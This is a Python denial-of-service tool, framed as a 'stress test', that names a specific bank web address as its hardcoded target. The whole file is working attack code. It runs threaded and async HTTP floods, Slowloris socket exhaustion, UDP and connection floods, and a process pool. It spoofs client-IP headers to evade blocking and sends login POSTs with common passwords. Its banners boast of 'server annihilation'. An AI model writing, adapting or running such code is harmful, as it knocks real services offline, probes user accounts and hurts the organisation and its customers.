#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 BRUTAL SERVER STRESS TEST 🔥
Ultimate DoS attack using all system resources - merciless brutality
Designed to push server to complete breakdown
"""

import requests
import asyncio
import aiohttp
import time
import threading
import random
import socket
import ssl
import multiprocessing
import platform
from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
from datetime import datetime
import os
import sys
from urllib.parse import urlparse
import warnings
import queue
import logging
import signal

# Ignore all warnings
warnings.filterwarnings('ignore')

# Fix Windows asyncio issue
if platform.system() == 'Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# Suppress asyncio task warnings
logging.getLogger('asyncio').setLevel(logging.CRITICAL)

class UltimateBrutalDestroyer:
    def __init__(self, target_url="https://iibss.iraqiislamicb.iq/web/"):
        self.target_url = target_url
        self.successful_requests = 0
        self.failed_requests = 0
        self.lock = threading.Lock()
        self.running = True
        
        # System resources - Reduced to half for Windows stability
        self.cpu_count = multiprocessing.cpu_count()
        self.max_workers = self.cpu_count * 100  # Increased from 50 to 100 workers per CPU core
        self.max_sockets = 2000  # Increased from 1000 to 2000
        self.max_async_tasks = 1000  # Increased from 500 to 1000
        
        # Parse URL
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.hostname
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
        self.is_https = self.parsed_url.scheme == 'https'
        
        # Massive User Agent list
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/111.0 Firefox/111.0",
            "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0"
        ]
        
        # Diverse attack payloads
        self.login_payloads = []
        for i in range(100):  # Generate 100 different payloads
            self.login_payloads.append({
                "phone": f"07{random.randint(10000000, 99999999)}", 
                "password": random.choice(["123456", "password", "admin", "test", "12345678", "qwerty", "abc123", "root", "user", "login", "guest", "demo"])
            })

    def get_random_headers(self):
        """Generate random headers with IP spoofing"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': random.choice([
                'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'application/json, text/plain, */*',
                'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            ]),
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'ar,en-US;q=0.8', 'en-GB,en;q=0.9']),
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store']),
            'Pragma': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Remote-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Remote-Addr': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'X-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }

    def brutal_http_worker(self, worker_id):
        """Ultra-fast HTTP worker"""
        session = requests.Session()
        session.verify = False
        
        # Connection pooling for efficiency
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=0
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        while self.running:
            try:
                headers = self.get_random_headers()
                
                # Mix different attack methods
                attack_type = random.randint(1, 4)
                
                if attack_type == 1:  # POST login attack
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    data = random.choice(self.login_payloads)
                    response = session.post(self.target_url, headers=headers, data=data, timeout=3)
                
                elif attack_type == 2:  # GET flood
                    response = session.get(self.target_url, headers=headers, timeout=3)
                
                elif attack_type == 3:  # GET with random parameters
                    params = {f'param{i}': random.randint(1, 999999) for i in range(random.randint(1, 5))}
                    response = session.get(self.target_url, headers=headers, params=params, timeout=3)
                
                else:  # HEAD requests
                    response = session.head(self.target_url, headers=headers, timeout=3)
                
                with self.lock:
                    self.successful_requests += 1
                
            except Exception:
                with self.lock:
                    self.failed_requests += 1
            
            # Minimal delay for maximum speed
            time.sleep(random.uniform(0.00005, 0.0005))  # Reduced from 0.0001-0.001 to 0.00005-0.0005

    def slowloris_destroyer(self):
        """Advanced Slowloris attack"""
        sockets = []
        
        def create_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                
                if self.is_https:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=self.host)
                
                s.connect((self.host, self.port))
                
                # Send incomplete HTTP request
                s.send(f"GET {self.parsed_url.path or '/'} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.host}\r\n".encode())
                s.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                s.send("Accept-language: en-US,en;q=0.5\r\n".encode())
                
                return s
            except Exception:
                return None
        
        while self.running:
            # Maintain maximum socket connections
            while len(sockets) < self.max_sockets and self.running:
                s = create_socket()
                if s:
                    sockets.append(s)
            
            # Send keep-alive headers to all sockets
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 999999)}\r\n".encode())
                except:
                    sockets.remove(s)
            
            time.sleep(0.5)

    async def async_destroyer(self):
        """Ultra-fast async attack"""
        # Create optimized connector
        connector = aiohttp.TCPConnector(
            limit=self.max_async_tasks,
            limit_per_host=0,  # Remove per-host limit
            ssl=False,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
            use_dns_cache=True,
            ttl_dns_cache=300
        )
        
        timeout = aiohttp.ClientTimeout(total=3, connect=1)
        
        tasks = []
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                
                async def async_attack_task(task_id):
                    try:
                        while self.running:
                            try:
                                headers = self.get_random_headers()
                                
                                # Random attack method
                                if random.randint(1, 2) == 1:
                                    # POST attack
                                    data = random.choice(self.login_payloads)
                                    async with session.post(self.target_url, headers=headers, data=data) as response:
                                        await response.read()
                                else:
                                    # GET attack
                                    async with session.get(self.target_url, headers=headers) as response:
                                        await response.read()
                                
                                with self.lock:
                                    self.successful_requests += 1
                                    
                            except asyncio.CancelledError:
                                # Handle task cancellation gracefully
                                break
                            except Exception:
                                with self.lock:
                                    self.failed_requests += 1
                            
                            # Check if we should stop
                            if not self.running:
                                break
                                
                            await asyncio.sleep(0.0001)
                    except asyncio.CancelledError:
                        pass
                    except Exception:
                        pass
                
                # Create massive number of async tasks
                for i in range(self.max_async_tasks):
                    task = asyncio.create_task(async_attack_task(i))
                    tasks.append(task)
                
                # Wait for tasks with proper cancellation handling
                try:
                    await asyncio.gather(*tasks, return_exceptions=True)
                except Exception:
                    pass
                    
        except Exception:
            pass
        finally:
            # Properly cancel all remaining tasks
            for task in tasks:
                if not task.done():
                    task.cancel()
            
            # Wait for all tasks to be cancelled with timeout
            if tasks:
                try:
                    await asyncio.wait_for(
                        asyncio.gather(*tasks, return_exceptions=True),
                        timeout=2.0
                    )
                except asyncio.TimeoutError:
                    pass
                except Exception:
                    pass

    def udp_flood_attack(self):
        """UDP flood attack"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Send random UDP packets
                for _ in range(200):  # Increased from 100 to 200
                    if not self.running:
                        break
                    
                    data = os.urandom(random.randint(1024, 8192))
                    try:
                        sock.sendto(data, (self.host, self.port))
                        sock.sendto(data, (self.host, 80))  # Try HTTP port too
                        sock.sendto(data, (self.host, 443))  # Try HTTPS port too
                    except Exception:
                        pass
                
                sock.close()
                time.sleep(0.1)
            except Exception:
                time.sleep(0.1)

    def syn_flood_attack(self):
        """SYN flood attack simulation"""
        while self.running:
            try:
                for _ in range(100):  # Increased from 50 to 100
                    if not self.running:
                        break
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    try:
                        sock.connect_ex((self.host, self.port))
                    except Exception:
                        pass
                    finally:
                        sock.close()
                
                time.sleep(0.01)
            except Exception:
                time.sleep(0.1)

    def process_worker(self, process_id):
        """Worker process for multi-processing attack"""
        local_success = 0
        local_failed = 0
        
        session = requests.Session()
        session.verify = False
        
        while self.running:
            try:
                headers = self.get_random_headers()
                
                if random.randint(1, 2) == 1:
                    data = random.choice(self.login_payloads)
                    response = session.post(self.target_url, headers=headers, data=data, timeout=2)
                else:
                    response = session.get(self.target_url, headers=headers, timeout=2)
                
                local_success += 1
                
            except Exception:
                local_failed += 1
            
            time.sleep(0.00005)  # Reduced from 0.0001 to 0.00005
        
        return local_success, local_failed

    def ultimate_destruction(self):
        """Launch all attack types simultaneously using all system resources"""
        print("🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥")
        print("💀💀💀    ULTIMATE BRUTAL SERVER DESTROYER    💀💀💀")
        print("🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥")
        print(f"🎯 TARGET: {self.target_url}")
        print(f"💻 CPU CORES: {self.cpu_count}")
        print(f"🧵 MAX WORKERS: {self.max_workers}")
        print(f"🔌 MAX SOCKETS: {self.max_sockets}")
        print(f"⚡ MAX ASYNC TASKS: {self.max_async_tasks}")
        print("🚨 ALL ATTACK TYPES ACTIVE - TOTAL ANNIHILATION MODE!")
        print("⚡ Press Ctrl+C to stop the carnage")
        print("=" * 80)
        
        # Start all attack types
        threads = []
        
        # 1. Multi-threaded HTTP attacks
        print("🚀 Starting HTTP thread army...")
        thread_batch_size = 200  # Increased from 100 to 200
        for batch in range(0, min(self.max_workers, 1000), thread_batch_size):  # Increased from 500 to 1000
            batch_end = min(batch + thread_batch_size, min(self.max_workers, 1000))
            for i in range(batch, batch_end):
                thread = threading.Thread(target=self.brutal_http_worker, args=(i,), daemon=True)
                thread.start()
                threads.append(thread)
            
            # Reduced delay between batches
            time.sleep(0.01)  # Reduced from 0.05 to 0.01
            print(f"   Created {len(threads)} threads...")
        
        print(f"✅ HTTP thread army complete: {len(threads)} threads")
        
        # 2. Slowloris attack
        print("🐌 Starting Slowloris destroyer...")
        slowloris_thread = threading.Thread(target=self.slowloris_destroyer, daemon=True)
        slowloris_thread.start()
        threads.append(slowloris_thread)
        
        # 3. Async attack with proper cleanup
        print("⚡ Starting async destroyer...")
        def run_async_attack():
            try:
                # Create new event loop for this thread
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    loop.run_until_complete(self.async_destroyer())
                except Exception:
                    pass
                finally:
                    # Clean up the loop
                    try:
                        # Cancel all remaining tasks
                        pending = asyncio.all_tasks(loop)
                        for task in pending:
                            task.cancel()
                        
                        # Wait for all tasks to complete cancellation
                        if pending:
                            loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
                    except Exception:
                        pass
                    finally:
                        loop.close()
            except Exception:
                pass
        
        async_thread = threading.Thread(target=run_async_attack, daemon=True)
        async_thread.start()
        threads.append(async_thread)
        
        # 4. UDP flood
        print("💥 Starting UDP flood...")
        for i in range(self.cpu_count * 2):  # Increased from cpu_count to cpu_count * 2
            udp_thread = threading.Thread(target=self.udp_flood_attack, daemon=True)
            udp_thread.start()
            threads.append(udp_thread)
        
        # 5. SYN flood simulation
        print("🔥 Starting SYN flood simulation...")
        for i in range(self.cpu_count * 4):  # Increased from cpu_count * 2 to cpu_count * 4
            syn_thread = threading.Thread(target=self.syn_flood_attack, daemon=True)
            syn_thread.start()
            threads.append(syn_thread)
        
        # 6. Multi-process attack
        print("🚀 Starting process army...")
        process_pool = ProcessPoolExecutor(max_workers=self.cpu_count * 2)  # Increased from cpu_count to cpu_count * 2
        process_futures = []
        for i in range(self.cpu_count * 2):  # Increased from cpu_count to cpu_count * 2
            future = process_pool.submit(self.process_worker, i)
            process_futures.append(future)
        
        print(f"💀 TOTAL DESTRUCTION INITIATED - {len(threads)} THREADS + {self.cpu_count} PROCESSES")
        print("=" * 80)
        
        # Monitor and display stats
        start_time = time.time()
        try:
            while self.running:
                elapsed = time.time() - start_time
                total_requests = self.successful_requests + self.failed_requests
                rps = total_requests / elapsed if elapsed > 0 else 0
                
                print(f"\r💀 ANNIHILATING: {total_requests:,} | "
                      f"RPS: {rps:.0f} | "
                      f"SUCCESS: {self.successful_requests:,} | "
                      f"FAILED: {self.failed_requests:,} | "
                      f"TIME: {elapsed:.0f}s | "
                      f"THREADS: {len([t for t in threads if t.is_alive()])}", 
                      end="", flush=True)
                
                time.sleep(0.5)  # Faster updates
                
        except KeyboardInterrupt:
            print("\n\n🛑 DESTRUCTION STOPPED BY USER")
            self.running = False
            
            # Give threads time to see the running flag change
            time.sleep(1)
            
            # Cleanup processes
            print("🧹 Cleaning up processes...")
            try:
                process_pool.shutdown(wait=False)
            except Exception:
                pass
            
            # Final stats
            total_time = time.time() - start_time
            total_requests = self.successful_requests + self.failed_requests
            final_rps = total_requests / total_time if total_time > 0 else 0
            
            print("=" * 80)
            print("💀 FINAL ANNIHILATION REPORT 💀")
            print("=" * 80)
            print(f"🎯 Target: {self.target_url}")
            print(f"⏱️  Duration: {total_time:.2f} seconds")
            print(f"📊 Total Requests: {total_requests:,}")
            print(f"✅ Successful: {self.successful_requests:,}")
            print(f"❌ Failed: {self.failed_requests:,}")
            print(f"🔥 Average RPS: {final_rps:.2f}")
            print(f"💻 System Resources Used: {self.cpu_count} CPU cores")
            print(f"🧵 Threads Deployed: {len(threads)}")
            print("💀 SERVER ANNIHILATION COMPLETE 💀")
            print("=" * 80)


def main():
    """Launch ultimate destruction"""
    target_url = "https://iibss.iraqiislamicb.iq/web/"
    
    # Create ultimate destroyer
    destroyer = UltimateBrutalDestroyer(target_url)
    
    # Setup signal handler for proper cleanup
    def signal_handler(signum, frame):
        print("\n🛑 Received interrupt signal, shutting down gracefully...")
        destroyer.running = False
        
        # Give some time for cleanup
        time.sleep(2)
        
        # Force exit if needed
        sys.exit(0)
    
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    if hasattr(signal, 'SIGTERM'):
        signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        # Begin total annihilation
        destroyer.ultimate_destruction()
    except Exception as e:
        print(f"\n❌ Error occurred: {e}")
        destroyer.running = False
    finally:
        # Ensure cleanup
        destroyer.running = False
        print("🧹 Final cleanup completed")


if __name__ == "__main__":
    # Suppress additional warnings for cleaner output
    warnings.filterwarnings('ignore', category=RuntimeWarning)
    warnings.filterwarnings('ignore', category=DeprecationWarning)
    
    main()
